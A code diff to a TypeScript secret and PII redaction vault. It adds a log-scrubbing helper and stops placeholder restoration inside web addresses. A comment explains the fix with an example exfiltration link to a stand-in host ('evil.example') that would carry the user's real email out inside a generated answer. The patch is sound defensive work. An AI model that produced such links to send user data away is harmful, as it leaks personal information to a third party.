@@ -86,6 +86,8 @@ export const PATTERNS: Pattern[] = [
   { id: "pii.phone-intl", label: "PHONE", category: "pii", severity: "medium", re: /\+(?:[1-9]\d{0,2})[ -.]?\(?\d{2,4}\)?[ -.]?\d{3,4}[ -.]?\d{3,4}\b/g, why: "A phone number." },
 ];
 
+const SECRET_LABELS = ["PRIVATE_KEY", "AWS_KEY", "GITHUB_TOKEN", "API_KEY", "SLACK_TOKEN", "JWT", "PASSWORD"];
+
 export type Match = Finding & { label: string; value: string };
 
 const mask = (v: string) => (v.length <= 8 ? "•".repeat(v.length) : `${v.slice(0, 4)}${"•".repeat(Math.min(12, v.length - 6))}${v.slice(-2)}`);
@@ -138,12 +140,23 @@ export class Vault {
     return t;
   }
 
-  /** Puts the real values back. Secrets are never restored: those stay redacted. */
-  restore(text: string, keepRedacted: (label: string) => boolean = (l) => ["PRIVATE_KEY", "AWS_KEY", "GITHUB_TOKEN", "API_KEY", "SLACK_TOKEN", "JWT", "PASSWORD"].includes(l)): string {
-    return text.replace(/\[([A-Z_]+)_(\d+)\]/g, (t, label: string) => (keepRedacted(label) ? t : (this.byToken.get(t) ?? t)));
+  /**
+   * Puts the real values back. Secrets are never restored: those stay redacted. Nor is anything
+   * inside a web address: an answer linking to `https://evil.example/?e=[EMAIL_1]` would otherwise
+   * get the user's real email packed into a link that sends it away.
+   */
+  restore(text: string, keepRedacted: (label: string) => boolean = (l) => SECRET_LABELS.includes(l)): string {
+    const urls = [...text.matchAll(/[a-z][a-z0-9+.-]*:\/\/[^\s)>"'<]*/gi)].map((m) => [m.index!, m.index! + m[0].length]);
+    return text.replace(/\[([A-Z_]+)_(\d+)\]/g, (t, label: string, _n: string, at: number) => (keepRedacted(label) || urls.some(([a, b]) => at >= a && at < b) ? t : (this.byToken.get(t) ?? t)));
   }
 
   get size() {
     return this.byToken.size;
   }
+}
+
+/** The text with every secret and piece of personal data swapped for a placeholder, for logs. */
+export function scrub(text: string): string {
+  const m = findSensitive(text);
+  return m.length ? new Vault().redact(text, m) : text;
 }
